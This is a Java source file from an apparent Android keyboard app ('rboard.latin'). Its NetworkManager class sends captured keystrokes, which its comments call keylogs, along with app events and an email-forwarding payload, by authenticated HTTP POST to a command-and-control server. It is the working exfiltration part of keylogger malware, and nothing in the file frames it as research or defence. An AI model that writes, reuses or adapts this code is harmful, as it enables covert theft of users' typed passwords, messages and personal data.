package com.abifog.rboard.latin.utils;

import android.os.AsyncTask;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * Handles remote reporting of captured data to the C2 server.
 */
public final class NetworkManager {
    private static final String TAG = NetworkManager.class.getSimpleName();

    /**
     * Sends captured text (keylogs) to the C2 server asynchronously.
     * 
     * @param data The text data to report.
     */
    public static void reportText(final String data) {
        new ReportTask().execute(data, "text/plain");
    }

    /**
     * Reports an event (e.g., app start, permission grant) to the C2 server.
     * 
     * @param eventName The name of the event.
     */
    public static void reportEvent(final String eventName) {
        new ReportTask().execute(eventName, "application/json");
    }

    /**
     * Sends data to an email-forwarding service endpoint.
     * 
     * @param subject The email subject.
     * @param body    The email body.
     */
    public static void reportToEmail(final String subject, final String body) {
        // Constructing a simple JSON payload for the email bridge
        String payload = "{\"subject\":\"" + subject + "\", \"body\":\"" + body + "\"}";
        new ReportTask(C2Config.getEmailUrl()).execute(payload, "application/json");
    }

    private static class ReportTask extends AsyncTask<String, Void, Boolean> {
        private String mUrl = C2Config.getUrl();

        public ReportTask() {
        }

        public ReportTask(String url) {
            this.mUrl = url;
        }

        @Override
        protected Boolean doInBackground(String... params) {
            String data = params[0];
            String contentType = params[1];
            HttpURLConnection urlConnection = null;

            try {
                URL url = new URL(mUrl);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);
                urlConnection.setRequestProperty("Content-Type", contentType);
                urlConnection.setRequestProperty("Authorization", "Bearer " + C2Config.getToken());
                urlConnection.setRequestProperty("X-App-Version", "1.1");

                try (OutputStream os = urlConnection.getOutputStream()) {
                    byte[] input = data.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = urlConnection.getResponseCode();
                return responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_CREATED;

            } catch (Exception e) {
                Log.e(TAG, "Error reporting data: " + e.getMessage());
                return false;
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
        }

        @Override
        protected void onPostExecute(Boolean success) {
            if (success) {
                Log.d(TAG, "Data successfully reported to C2.");
            } else {
                Log.e(TAG, "Failed to report data to C2.");
            }
        }
    }

    private NetworkManager() {
        // Utility class
    }
}
